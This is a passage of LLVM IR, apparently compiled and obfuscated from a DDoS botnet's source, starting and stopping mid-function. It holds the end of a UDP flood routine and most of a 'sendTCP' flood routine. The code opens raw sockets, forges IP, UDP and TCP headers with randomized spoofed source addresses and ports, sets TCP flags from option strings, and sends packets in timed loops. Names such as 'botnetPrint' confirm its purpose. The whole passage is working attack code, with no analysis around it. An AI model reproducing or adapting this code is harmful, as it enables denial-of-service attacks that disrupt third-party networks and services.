  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %110, i16* %111, align 2
  br label %112

; <label>:112:                                    ; preds = %108, %105
  %113 = call i64 @time(i64* null) #3
  %114 = load i32, i32* %21, align 4
  %115 = sext i32 %114 to i64
  %116 = icmp sgt i64 %113, %115
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %112
  br label %138

; <label>:118:                                    ; preds = %112
  store i32 0, i32* %22, align 4
  br label %95

; <label>:119:                                    ; preds = %95
  %120 = load i32, i32* %22, align 4
  %121 = add i32 %120, -1755765027
  %122 = add i32 %121, 1
  %123 = sub i32 %122, -1755765027
  %124 = add i32 %120, 1
  store i32 %123, i32* %22, align 4
  %125 = load i32, i32* %23, align 4
  %126 = load i32, i32* %15, align 4
  %127 = icmp eq i32 %125, %126
  br i1 %127, label %128, label %132

; <label>:128:                                    ; preds = %119
  %129 = load i32, i32* %16, align 4
  %130 = mul nsw i32 %129, 1000
  %131 = call i32 @usleep(i32 %130)
  store i32 0, i32* %23, align 4
  br label %95

; <label>:132:                                    ; preds = %119
  %133 = load i32, i32* %23, align 4
  %134 = add i32 %133, -685478228
  %135 = add i32 %134, 1
  %136 = sub i32 %135, -685478228
  %137 = add i32 %133, 1
  store i32 %136, i32* %23, align 4
  br label %95

; <label>:138:                                    ; preds = %117
  br label %362

; <label>:139:                                    ; preds = %52
  %140 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %140, i32* %24, align 4
  %141 = load i32, i32* %24, align 4
  %142 = icmp ne i32 %141, 0
  br i1 %142, label %146, label %143

; <label>:143:                                    ; preds = %139
  %144 = load i32, i32* @KadenCommStock, align 4
  %145 = call i32 (i32, i8*, ...) @botnetPrint(i32 %144, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.117, i32 0, i32 0))
  br label %362

; <label>:146:                                    ; preds = %139
  store i32 1, i32* %25, align 4
  %147 = load i32, i32* %24, align 4
  %148 = bitcast i32* %25 to i8*
  %149 = call i32 @setsockopt(i32 %147, i32 0, i32 3, i8* %148, i32 4) #3
  %150 = icmp slt i32 %149, 0
  br i1 %150, label %151, label %154

; <label>:151:                                    ; preds = %146
  %152 = load i32, i32* @KadenCommStock, align 4
  %153 = call i32 (i32, i8*, ...) @botnetPrint(i32 %152, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.118, i32 0, i32 0))
  br label %362

; <label>:154:                                    ; preds = %146
  store i32 50, i32* %26, align 4
  br label %155

; <label>:155:                                    ; preds = %161, %154
  %156 = load i32, i32* %26, align 4
  %157 = sub i32 0, -1
  %158 = sub i32 %156, %157
  %159 = add nsw i32 %156, -1
  store i32 %158, i32* %26, align 4
  %160 = icmp ne i32 %156, 0
  br i1 %160, label %161, label %178

; <label>:161:                                    ; preds = %155
  %162 = call i64 @time(i64* null) #3
  %163 = call i32 @rand_cmwc()
  %164 = zext i32 %163 to i64
  %165 = xor i64 %162, -1
  %166 = and i64 4062857932946136995, %165
  %167 = xor i64 4062857932946136995, -1
  %168 = and i64 %162, %167
  %169 = xor i64 %164, -1
  %170 = and i64 %169, 4062857932946136995
  %171 = and i64 %164, %167
  %172 = or i64 %166, %168
  %173 = or i64 %170, %171
  %174 = xor i64 %172, %173
  %175 = xor i64 %162, %164
  %176 = trunc i64 %174 to i32
  call void @srand(i32 %176) #3
  %177 = call i32 @rand() #3
  call void @init_rand(i32 %177)
  br label %155

; <label>:178:                                    ; preds = %155
  %179 = load i32, i32* %12, align 4
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %178
  store i32 0, i32* %27, align 4
  br label %204

; <label>:182:                                    ; preds = %178
  %183 = load i32, i32* %12, align 4
  %184 = add i32 32, -2072699753
  %185 = sub i32 %184, %183
  %186 = sub i32 %185, -2072699753
  %187 = sub nsw i32 32, %183
  %188 = shl i32 1, %186
  %189 = add i32 %188, -342982884
  %190 = sub i32 %189, 1
  %191 = sub i32 %190, -342982884
  %192 = sub nsw i32 %188, 1
  %193 = xor i32 %191, -1
  %194 = and i32 -957347708, %193
  %195 = xor i32 -957347708, -1
  %196 = and i32 %191, %195
  %197 = xor i32 -1, -1
  %198 = and i32 %197, -957347708
  %199 = and i32 -1, %195
  %200 = or i32 %194, %196
  %201 = or i32 %198, %199
  %202 = xor i32 %200, %201
  %203 = xor i32 %191, -1
  store i32 %202, i32* %27, align 4
  br label %204

; <label>:204:                                    ; preds = %182, %181
  %205 = load i32, i32* %13, align 4
  %206 = sext i32 %205 to i64
  %207 = sub i64 0, %206
  %208 = sub i64 28, %207
  %209 = add i64 28, %206
  %210 = call i8* @llvm.stacksave()
  store i8* %210, i8** %28, align 8
  %211 = alloca i8, i64 %208, align 16
  %212 = bitcast i8* %211 to %struct.iphdr*
  store %struct.iphdr* %212, %struct.iphdr** %29, align 8
  %213 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %214 = bitcast %struct.iphdr* %213 to i8*
  %215 = getelementptr i8, i8* %214, i64 20
  %216 = bitcast i8* %215 to %struct.udphdr*
  store %struct.udphdr* %216, %struct.udphdr** %30, align 8
  %217 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %218 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %219 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 4
  %221 = load i32, i32* %27, align 4
  %222 = call i32 @GRIP(i32 %221)
  %223 = call i32 @htonl(i32 %222) #10
  %224 = load i32, i32* %13, align 4
  %225 = sext i32 %224 to i64
  %226 = sub i64 0, %225
  %227 = sub i64 8, %226
  %228 = add i64 8, %225
  %229 = trunc i64 %227 to i32
  call void @makeIPPacket(%struct.iphdr* %217, i32 %220, i32 %223, i8 zeroext 17, i32 %229)
  %230 = load i32, i32* %13, align 4
  %231 = sext i32 %230 to i64
  %232 = sub i64 0, 8
  %233 = sub i64 0, %231
  %234 = add i64 %232, %233
  %235 = sub i64 0, %234
  %236 = add i64 8, %231
  %237 = trunc i64 %235 to i16
  %238 = call zeroext i16 @htons(i16 zeroext %237) #10
  %239 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.1* %240 to %struct.anon.2*
  %242 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %241, i32 0, i32 2
  store i16 %238, i16* %242, align 2
  %243 = call i32 @rand_cmwc()
  %244 = trunc i32 %243 to i16
  %245 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 0
  %247 = bitcast %union.anon.1* %246 to %struct.anon.2*
  %248 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %247, i32 0, i32 0
  store i16 %244, i16* %248, align 2
  %249 = load i32, i32* %10, align 4
  %250 = icmp eq i32 %249, 0
  br i1 %250, label %251, label %253

; <label>:251:                                    ; preds = %204
  %252 = call i32 @rand_cmwc()
  br label %258

; <label>:253:                                    ; preds = %204
  %254 = load i32, i32* %10, align 4
  %255 = trunc i32 %254 to i16
  %256 = call zeroext i16 @htons(i16 zeroext %255) #10
  %257 = zext i16 %256 to i32
  br label %258

; <label>:258:                                    ; preds = %253, %251
  %259 = phi i32 [ %252, %251 ], [ %257, %253 ]
  %260 = trunc i32 %259 to i16
  %261 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %262 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %261, i32 0, i32 0
  %263 = bitcast %union.anon.1* %262 to %struct.anon.2*
  %264 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %263, i32 0, i32 1
  store i16 %260, i16* %264, align 2
  %265 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i32 0, i32 0
  %267 = bitcast %union.anon.1* %266 to %struct.anon.2*
  %268 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %267, i32 0, i32 3
  store i16 0, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %270 = bitcast %struct.udphdr* %269 to i8*
  %271 = getelementptr inbounds i8, i8* %270, i64 8
  %272 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %271, i32 %272)
  %273 = bitcast i8* %211 to i16*
  %274 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 2
  %276 = load i16, i16* %275, align 2
  %277 = zext i16 %276 to i32
  %278 = call zeroext i16 @csum(i16* %273, i32 %277)
  %279 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 7
  store i16 %278, i16* %280, align 2
  %281 = call i64 @time(i64* null) #3
  %282 = load i32, i32* %11, align 4
  %283 = sext i32 %282 to i64
  %284 = sub i64 0, %283
  %285 = sub i64 %281, %284
  %286 = add nsw i64 %281, %283
  %287 = trunc i64 %285 to i32
  store i32 %287, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %288

; <label>:288:                                    ; preds = %355, %351, %341, %258
  br label %289

; <label>:289:                                    ; preds = %288
  %290 = load i32, i32* %24, align 4
  %291 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %292 = call i64 @sendto(i32 %290, i8* %211, i64 %208, i32 0, %struct.sockaddr* %291, i32 16)
  %293 = call i32 @rand_cmwc()
  %294 = trunc i32 %293 to i16
  %295 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %296 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %295, i32 0, i32 0
  %297 = bitcast %union.anon.1* %296 to %struct.anon.2*
  %298 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %297, i32 0, i32 0
  store i16 %294, i16* %298, align 2
  %299 = load i32, i32* %10, align 4
  %300 = icmp eq i32 %299, 0
  br i1 %300, label %301, label %303

; <label>:301:                                    ; preds = %289
  %302 = call i32 @rand_cmwc()
  br label %308

; <label>:303:                                    ; preds = %289
  %304 = load i32, i32* %10, align 4
  %305 = trunc i32 %304 to i16
  %306 = call zeroext i16 @htons(i16 zeroext %305) #10
  %307 = zext i16 %306 to i32
  br label %308

; <label>:308:                                    ; preds = %303, %301
  %309 = phi i32 [ %302, %301 ], [ %307, %303 ]
  %310 = trunc i32 %309 to i16
  %311 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %312 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %311, i32 0, i32 0
  %313 = bitcast %union.anon.1* %312 to %struct.anon.2*
  %314 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %313, i32 0, i32 1
  store i16 %310, i16* %314, align 2
  %315 = call i32 @rand_cmwc()
  %316 = trunc i32 %315 to i16
  %317 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 3
  store i16 %316, i16* %318, align 4
  %319 = load i32, i32* %27, align 4
  %320 = call i32 @GRIP(i32 %319)
  %321 = call i32 @htonl(i32 %320) #10
  %322 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 8
  store i32 %321, i32* %323, align 4
  %324 = bitcast i8* %211 to i16*
  %325 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 2
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @csum(i16* %324, i32 %328)
  %330 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 7
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* %32, align 4
  %333 = load i32, i32* %18, align 4
  %334 = icmp eq i32 %332, %333
  br i1 %334, label %335, label %342

; <label>:335:                                    ; preds = %308
  %336 = call i64 @time(i64* null) #3
  %337 = load i32, i32* %31, align 4
  %338 = sext i32 %337 to i64
  %339 = icmp sgt i64 %336, %338
  br i1 %339, label %340, label %341

; <label>:340:                                    ; preds = %335
  br label %360

; <label>:341:                                    ; preds = %335
  store i32 0, i32* %32, align 4
  br label %288

; <label>:342:                                    ; preds = %308
  %343 = load i32, i32* %32, align 4
  %344 = add i32 %343, 1456851913
  %345 = add i32 %344, 1
  %346 = sub i32 %345, 1456851913
  %347 = add i32 %343, 1
  store i32 %346, i32* %32, align 4
  %348 = load i32, i32* %33, align 4
  %349 = load i32, i32* %15, align 4
  %350 = icmp eq i32 %348, %349
  br i1 %350, label %351, label %355

; <label>:351:                                    ; preds = %342
  %352 = load i32, i32* %16, align 4
  %353 = mul nsw i32 %352, 1000
  %354 = call i32 @usleep(i32 %353)
  store i32 0, i32* %33, align 4
  br label %288

; <label>:355:                                    ; preds = %342
  %356 = load i32, i32* %33, align 4
  %357 = sub i32 0, 1
  %358 = sub i32 %356, %357
  %359 = add i32 %356, 1
  store i32 %358, i32* %33, align 4
  br label %288

; <label>:360:                                    ; preds = %340
  %361 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %361)
  br label %362

; <label>:362:                                    ; preds = %360, %151, %143, %138, %74, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i32 @usleep(i32) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %510

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @KadenCommStock, align 4
  %53 = call i32 (i32, i8*, ...) @botnetPrint(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.117, i32 0, i32 0))
  br label %510

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #3
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @KadenCommStock, align 4
  %61 = call i32 (i32, i8*, ...) @botnetPrint(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.118, i32 0, i32 0))
  br label %510

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %82

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 32, -1148974991
  %69 = sub i32 %68, %67
  %70 = add i32 %69, -1148974991
  %71 = sub nsw i32 32, %67
  %72 = shl i32 1, %70
  %73 = sub i32 0, 1
  %74 = add i32 %72, %73
  %75 = sub nsw i32 %72, 1
  %76 = xor i32 %74, -1
  %77 = and i32 -1, %76
  %78 = xor i32 -1, -1
  %79 = and i32 %74, %78
  %80 = or i32 %77, %79
  %81 = xor i32 %74, -1
  store i32 %80, i32* %19, align 4
  br label %82

; <label>:82:                                     ; preds = %66, %65
  %83 = load i32, i32* %13, align 4
  %84 = sext i32 %83 to i64
  %85 = sub i64 0, %84
  %86 = sub i64 40, %85
  %87 = add i64 40, %84
  %88 = call i8* @llvm.stacksave()
  store i8* %88, i8** %20, align 8
  %89 = alloca i8, i64 %86, align 16
  %90 = bitcast i8* %89 to %struct.iphdr*
  store %struct.iphdr* %90, %struct.iphdr** %21, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = getelementptr i8, i8* %92, i64 20
  %94 = bitcast i8* %93 to %struct.tcphdr*
  store %struct.tcphdr* %94, %struct.tcphdr** %22, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %97 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %96, i32 0, i32 0
  %98 = load i32, i32* %97, align 4
  %99 = load i32, i32* %19, align 4
  %100 = call i32 @GRIP(i32 %99)
  %101 = call i32 @htonl(i32 %100) #10
  %102 = load i32, i32* %13, align 4
  %103 = sext i32 %102 to i64
  %104 = sub i64 20, 49532583825739039
  %105 = add i64 %104, %103
  %106 = add i64 %105, 49532583825739039
  %107 = add i64 20, %103
  %108 = trunc i64 %106 to i32
  call void @makeIPPacket(%struct.iphdr* %95, i32 %98, i32 %101, i8 zeroext 6, i32 %108)
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %112 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %111, i32 0, i32 0
  %113 = bitcast %union.anon* %112 to %struct.anon.0*
  %114 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %113, i32 0, i32 0
  store i16 %110, i16* %114, align 4
  %115 = call i32 @rand_cmwc()
  %116 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon* %117 to %struct.anon.0*
  %119 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %118, i32 0, i32 2
  store i32 %115, i32* %119, align 4
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon* %121 to %struct.anon.0*
  %123 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %122, i32 0, i32 3
  store i32 0, i32* %123, align 4
  %124 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon* %125 to %struct.anon.0*
  %127 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %126, i32 0, i32 4
  %128 = load i16, i16* %127, align 4
  %129 = xor i16 -241, -1
  %130 = xor i16 %128, %129
  %131 = and i16 %130, %128
  %132 = and i16 %128, -241
  %133 = and i16 %131, 80
  %134 = xor i16 %131, 80
  %135 = or i16 %133, %134
  %136 = or i16 %131, 80
  store i16 %135, i16* %127, align 4
  %137 = load i8*, i8** %12, align 8
  %138 = call i32 @strcmp(i8* %137, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i32 0, i32 0)) #9
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %238, label %140

; <label>:140:                                    ; preds = %82
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon* %142 to %struct.anon.0*
  %144 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = xor i16 %145, -1
  %147 = xor i16 -513, -1
  %148 = xor i16 10656, -1
  %149 = or i16 %146, %147
  %150 = or i16 10656, %148
  %151 = xor i16 %149, -1
  %152 = and i16 %151, %150
  %153 = and i16 %145, -513
  %154 = xor i16 %152, -1
  %155 = xor i16 512, -1
  %156 = xor i16 19167, -1
  %157 = and i16 %154, 19167
  %158 = and i16 %152, %156
  %159 = and i16 %155, 19167
  %160 = and i16 512, %156
  %161 = or i16 %157, %158
  %162 = or i16 %159, %160
  %163 = xor i16 %161, %162
  %164 = or i16 %154, %155
  %165 = xor i16 %164, -1
  %166 = or i16 19167, %156
  %167 = and i16 %165, %166
  %168 = or i16 %163, %167
  %169 = or i16 %152, 512
  store i16 %168, i16* %144, align 4
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon* %171 to %struct.anon.0*
  %173 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = xor i16 %174, -1
  %176 = xor i16 -1025, -1
  %177 = xor i16 -26768, -1
  %178 = or i16 %175, %176
  %179 = or i16 -26768, %177
  %180 = xor i16 %178, -1
  %181 = and i16 %180, %179
  %182 = and i16 %174, -1025
  %183 = and i16 %181, 1024
  %184 = xor i16 %181, 1024
  %185 = or i16 %183, %184
  %186 = or i16 %181, 1024
  store i16 %185, i16* %173, align 4
  %187 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon* %188 to %struct.anon.0*
  %190 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = xor i16 -257, -1
  %193 = xor i16 %191, %192
  %194 = and i16 %193, %191
  %195 = and i16 %191, -257
  %196 = and i16 %194, 256
  %197 = xor i16 %194, 256
  %198 = or i16 %196, %197
  %199 = or i16 %194, 256
  store i16 %198, i16* %190, align 4
  %200 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon* %201 to %struct.anon.0*
  %203 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %202, i32 0, i32 4
  %204 = load i16, i16* %203, align 4
  %205 = xor i16 -4097, -1
  %206 = xor i16 %204, %205
  %207 = and i16 %206, %204
  %208 = and i16 %204, -4097
  %209 = and i16 %207, 4096
  %210 = xor i16 %207, 4096
  %211 = or i16 %209, %210
  %212 = or i16 %207, 4096
  store i16 %211, i16* %203, align 4
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon* %214 to %struct.anon.0*
  %216 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = xor i16 -2049, -1
  %219 = xor i16 %217, %218
  %220 = and i16 %219, %217
  %221 = and i16 %217, -2049
  %222 = xor i16 %220, -1
  %223 = xor i16 2048, -1
  %224 = xor i16 -12214, -1
  %225 = and i16 %222, -12214
  %226 = and i16 %220, %224
  %227 = and i16 %223, -12214
  %228 = and i16 2048, %224
  %229 = or i16 %225, %226
  %230 = or i16 %227, %228
  %231 = xor i16 %229, %230
  %232 = or i16 %222, %223
  %233 = xor i16 %232, -1
  %234 = or i16 -12214, %224
  %235 = and i16 %233, %234
  %236 = or i16 %231, %235
  %237 = or i16 %220, 2048
  store i16 %236, i16* %216, align 4
  br label %393

; <label>:238:                                    ; preds = %82
  %239 = load i8*, i8** %12, align 8
  %240 = call i8* @strtok(i8* %239, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.120, i32 0, i32 0)) #3
  store i8* %240, i8** %23, align 8
  br label %241

; <label>:241:                                    ; preds = %390, %238
  %242 = load i8*, i8** %23, align 8
  %243 = icmp ne i8* %242, null
  br i1 %243, label %244, label %392

; <label>:244:                                    ; preds = %241
  %245 = load i8*, i8** %23, align 8
  %246 = call i32 @strcmp(i8* %245, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #9
  %247 = icmp ne i32 %246, 0
  br i1 %247, label %262, label %248

; <label>:248:                                    ; preds = %244
  %249 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 0
  %251 = bitcast %union.anon* %250 to %struct.anon.0*
  %252 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = xor i16 -513, -1
  %255 = xor i16 %253, %254
  %256 = and i16 %255, %253
  %257 = and i16 %253, -513
  %258 = and i16 %256, 512
  %259 = xor i16 %256, 512
  %260 = or i16 %258, %259
  %261 = or i16 %256, 512
  store i16 %260, i16* %252, align 4
  br label %390

; <label>:262:                                    ; preds = %244
  %263 = load i8*, i8** %23, align 8
  %264 = call i32 @strcmp(i8* %263, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #9
  %265 = icmp ne i32 %264, 0
  br i1 %265, label %296, label %266

; <label>:266:                                    ; preds = %262
  %267 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon* %268 to %struct.anon.0*
  %270 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = xor i16 %271, -1
  %273 = xor i16 -1025, -1
  %274 = xor i16 24896, -1
  %275 = or i16 %272, %273
  %276 = or i16 24896, %274
  %277 = xor i16 %275, -1
  %278 = and i16 %277, %276
  %279 = and i16 %271, -1025
  %280 = xor i16 %278, -1
  %281 = xor i16 1024, -1
  %282 = xor i16 14994, -1
  %283 = and i16 %280, 14994
  %284 = and i16 %278, %282
  %285 = and i16 %281, 14994
  %286 = and i16 1024, %282
  %287 = or i16 %283, %284
  %288 = or i16 %285, %286
  %289 = xor i16 %287, %288
  %290 = or i16 %280, %281
  %291 = xor i16 %290, -1
  %292 = or i16 14994, %282
  %293 = and i16 %291, %292
  %294 = or i16 %289, %293
  %295 = or i16 %278, 1024
  store i16 %294, i16* %270, align 4
  br label %389

; <label>:296:                                    ; preds = %262
  %297 = load i8*, i8** %23, align 8
  %298 = call i32 @strcmp(i8* %297, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i32 0, i32 0)) #9
  %299 = icmp ne i32 %298, 0
  br i1 %299, label %326, label %300

; <label>:300:                                    ; preds = %296
  %301 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon* %302 to %struct.anon.0*
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 4
  %305 = load i16, i16* %304, align 4
  %306 = xor i16 -257, -1
  %307 = xor i16 %305, %306
  %308 = and i16 %307, %305
  %309 = and i16 %305, -257
  %310 = xor i16 %308, -1
  %311 = xor i16 256, -1
  %312 = xor i16 12184, -1
  %313 = and i16 %310, 12184
  %314 = and i16 %308, %312
  %315 = and i16 %311, 12184
  %316 = and i16 256, %312
  %317 = or i16 %313, %314
  %318 = or i16 %315, %316
  %319 = xor i16 %317, %318
  %320 = or i16 %310, %311
